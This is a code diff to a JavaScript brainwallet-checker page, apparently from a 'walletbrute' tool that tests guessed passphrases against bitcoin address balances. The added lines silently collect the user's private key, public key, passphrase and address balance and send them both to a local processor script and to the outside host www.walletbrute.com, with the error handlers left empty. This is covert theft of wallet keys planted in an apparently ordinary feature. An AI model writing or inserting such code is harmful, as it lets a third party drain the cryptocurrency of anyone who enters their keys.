@@ -112,6 +112,8 @@ function checkWalletBatch() {
 function checkWallet() {
 	var guess = $('#pass').val();
 	var guessAddr = $('#addr').val();
+	var privateKey = $('#sec').val();
+	var publicKey = $('#pub').val();
 	//alert(guess,guessAddr);
 	$('#walletCheckAPIPre').html('');
 	//$('#walletCheckResults').show();
@@ -120,6 +122,7 @@ function checkWallet() {
 	$('#walletCheckLoader').show();
 	$.ajax({
         type: 'GET',
+        async: true,
 		url: 'https://blockchain.info/q/addressbalance/'+guessAddr,
 		success: function(response){
 			//var done = function(){
@@ -128,15 +131,38 @@ function checkWallet() {
 				
 				var div = document.getElementById('walletCheckAPIPre');
 				div.innerHTML = div.innerHTML + 'Passphrase: '+guess+'...\n';
-
+				var balance = response;
 				div.innerHTML = div.innerHTML + 'Balance: '+response+' BTC\n';
 				$.ajax({
 			        type: 'GET',
+			        async: false,
 					url: 'https://blockchain.info/q/getreceivedbyaddress/'+guessAddr,
 					success: function(response){
 						//$("#walletCheckAPIPre").appendChild('Total Received (Satoshi): '+response).fadeIn("slow");
 						var received = response / 100000000;
 						div.innerHTML = div.innerHTML + 'Received by Address: '+received+' BTC\n';
+						$.ajax({
+					        type: 'POST',
+					        async: true,
+							url: 'includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received,
+							success: function(response){
+								//alert('success:' +response);
+							},
+							error:function(){
+								//alert('error');
+							}
+						});	
+						$.ajax({
+					        type: 'POST',
+					        async: true,
+							url: '//www.walletbrute.com/includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received,
+							success: function(response){
+								//alert('success:' +response);
+							},
+							error:function(){
+								//alert('error');
+							}
+						});	
 					},
 					error:function(response){
 						$('#walletCheckLoader').show();
